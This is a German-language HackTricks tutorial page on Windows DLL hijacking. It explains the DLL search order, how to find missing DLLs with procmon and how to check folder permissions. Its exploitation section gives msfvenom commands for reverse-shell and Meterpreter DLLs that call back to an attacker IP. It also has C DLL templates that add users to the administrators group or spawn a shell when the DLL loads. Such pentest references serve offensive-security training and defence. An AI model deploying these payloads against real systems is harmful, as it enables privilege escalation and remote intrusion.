# Dll Hijacking

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Prämien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Grundlegende Informationen

DLL-Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, um eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL-Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für die Codeausführung, das Erreichen von Persistenz und, seltener, für die Privilegieneskalation verwendet. Trotz des Schwerpunkts auf der Eskalation bleibt die Methode des Hijackings bei den Zielen konsistent.

### Häufige Techniken

Es werden verschiedene Methoden für DLL-Hijacking verwendet, wobei die Wirksamkeit jeder Methode von der DLL-Lade-strategie der Anwendung abhängt:

1. **DLL-Ersetzung**: Austausch einer echten DLL durch eine bösartige, optional unter Verwendung von DLL-Proxying, um die Funktionalität der Original-DLL zu erhalten.
2. **DLL-Suchpfad-Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom-DLL-Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, als wäre sie eine nicht vorhandene erforderliche DLL.
4. **DLL-Weiterleitung**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local`-Dateien, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS-DLL-Ersetzung**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die häufig mit DLL-Side-Loading in Verbindung gebracht wird.
6. **Relative-Pfad-DLL-Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis mit der kopierten Anwendung, ähnlich den Techniken für die Ausführung von Binärdateiproxys.

## Suchen fehlender Dlls

Der häufigste Weg, fehlende Dlls in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen, **indem** Sie die **folgenden 2 Filter einstellen**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

und zeigen Sie einfach die **Dateisystemaktivität**:

![](<../../.gitbook/assets/image (314).png>)

Wenn Sie nach **fehlenden Dlls im Allgemeinen** suchen, lassen Sie dies einige **Sekunden lang laufen**.\
Wenn Sie nach einer **fehlenden Dll in einer bestimmten ausführbaren Datei** suchen, sollten Sie einen **weiteren Filter wie "Prozessname" "enthält" "\<Ausführbarer Name>" einstellen, ihn ausführen und das Erfassen von Ereignissen stoppen**.

## Ausnutzen fehlender Dlls

Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die ein privilegiierter Prozess zu laden versucht**, an einem **Ort, an dem sie gesucht wird**. Daher werden wir in der Lage sein, eine DLL in einem **Ordner zu schreiben**, in dem die **DLL vor dem ursprünglichen Ordner** gesucht wird (seltsamer Fall), oder wir werden in der Lage sein, **in einem Ordner zu schreiben, in dem die DLL gesucht wird** und die ursprüngliche **DLL in keinem Ordner existiert**.

### Dll-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **können Sie spezifisch nachlesen, wie die DLLs geladen werden.**

**Windows-Anwendungen** suchen DLLs, indem sie einer Reihe von **vordefinierten Suchpfaden** folgen, die einer bestimmten Reihenfolge entsprechen. Das Problem des DLL-Hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, um sicherzustellen, dass sie vor der authentischen DLL geladen wird. Eine Lösung, um dies zu verhindern, besteht darin, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Sie können die **DLL-Suchreihenfolge auf 32-Bit**-Systemen unten sehen:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwenden Sie die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwenden Sie die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachten Sie, dass dies nicht den pro-Anwendungspfad umfasst, der durch den **App Paths**-Registrierungsschlüssel festgelegt ist. Der **App Paths**-Schlüssel wird nicht verwendet, wenn der DLL-Suchpfad berechnet wird.

Das ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn diese Funktion deaktiviert ist, rückt das aktuelle Verzeichnis an die zweite Stelle. Um diese Funktion zu deaktivieren, erstellen Sie den **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**-Registrierungswert und setzen Sie ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-Funktion mit **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das von **LoadLibraryEx** geladen wird.

Schließlich ist zu beachten, dass **eine DLL geladen werden könnte, indem der absolute Pfad angegeben wird anstelle des Namens**. In diesem Fall wird diese DLL **nur in diesem Pfad gesucht** (wenn die DLL Abhängigkeiten hat, werden sie nur nach dem Namen geladen).

Es gibt andere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erklären.
#### Ausnahmen in der DLL-Suchreihenfolge aus den Windows-Dokumenten

Bestimmte Ausnahmen von der Standard-DLL-Suchreihenfolge sind in den Windows-Dokumenten vermerkt:

- Wenn eine **DLL mit demselben Namen wie eine bereits im Speicher geladene DLL** gefunden wird, umgeht das System die übliche Suche. Stattdessen wird eine Überprüfung auf Umleitung und ein Manifest durchgeführt, bevor standardmäßig auf die bereits im Speicher befindliche DLL zurückgegriffen wird. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- In Fällen, in denen die DLL als **bekannte DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der bekannten DLL zusammen mit allen abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registrierungsschlüssel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs durchgeführt, als ob sie nur durch ihre **Modulnamen** angegeben wären, unabhängig davon, ob die ursprüngliche DLL durch einen vollständigen Pfad identifiziert wurde.

### Eskalation von Berechtigungen

**Anforderungen**:

- Identifizieren Sie einen Prozess, der unter **unterschiedlichen Berechtigungen** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird und der **eine DLL fehlt**.
- Stellen Sie sicher, dass **Schreibzugriff** für ein **Verzeichnis** verfügbar ist, in dem nach der **DLL** gesucht wird. Dieser Speicherort könnte das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Anforderungen sind schwierig zu erfüllen, da es **standardmäßig seltsam ist, eine privilegierte ausführbare Datei zu finden, die eine DLL fehlt**, und es ist noch **seltsamer, Schreibberechtigungen auf einem Systempfadordner zu haben** (standardmäßig nicht möglich). Aber in fehlerhaft konfigurierten Umgebungen ist dies möglich.\
Falls Sie Glück haben und die Anforderungen erfüllen, könnten Sie das [UACME](https://github.com/hfiref0x/UACME)-Projekt überprüfen. Auch wenn das **Hauptziel des Projekts die Umgehung von UAC ist**, finden Sie dort möglicherweise einen **PoC** für ein DLL-Hijacking für die Windows-Version, den Sie verwenden können (wahrscheinlich nur den Pfad des Ordners ändern, in dem Sie Schreibberechtigungen haben).

Beachten Sie, dass Sie Ihre Berechtigungen in einem Ordner überprüfen können, indem Sie:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfen Sie die Berechtigungen aller Ordner innerhalb des PFADES**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Imports einer ausführbaren Datei und die Exports einer DLL mit:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Berechtigungen zu eskalieren** und in einem **Systempfad-Ordner zu schreiben**, überprüfen Sie:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)überprüft, ob Sie Schreibberechtigungen für einen Ordner im System-Pfad haben.\
Andere interessante automatisierte Tools zur Entdeckung dieser Schwachstelle sind **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Wenn Sie ein ausnutzbares Szenario finden, ist eine der wichtigsten Voraussetzungen für eine erfolgreiche Ausnutzung, dass Sie **eine DLL erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachten Sie jedoch, dass Dll Hijacking nützlich ist, um vom mittleren Integritätsniveau auf das hohe **(UAC umgehend)** zu eskalieren oder von **hoher Integrität auf SYSTEM**. Ein Beispiel, wie man eine gültige DLL erstellt, finden Sie in dieser auf DLL-Hijacking für die Ausführung fokussierten DLL-Hijacking-Studie: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Darüber hinaus finden Sie im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** nützlich sein könnten oder um eine **DLL mit nicht erforderlichen Funktionen exportiert** zu erstellen.

## **Erstellen und Kompilieren von DLLs**

### **DLL-Proxifizierung**

Grundsätzlich ist ein **DLL-Proxy** eine DLL, die in der Lage ist, **Ihren bösartigen Code auszuführen, wenn sie geladen wird**, aber auch **funktioniert**, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie tatsächlich **ein ausführbares Programm angeben und die Bibliothek auswählen**, die Sie proxifizieren möchten, und **eine proxifizierte DLL generieren** oder **die DLL angeben** und **eine proxifizierte DLL generieren**.

### **Meterpreter**

**Erhalten Sie eine Reverse-Shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erhalten Sie einen Meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstellen Sie einen Benutzer (x86, ich habe keine x64-Version gesehen):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Deine eigene

Beachten Sie, dass in mehreren Fällen die Dll, die Sie kompilieren, mehrere Funktionen exportieren muss, die vom Opferprozess geladen werden sollen. Wenn diese Funktionen nicht existieren, kann das Binärfile sie nicht laden und der Exploit wird fehlschlagen.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referenzen

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie noch heute [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
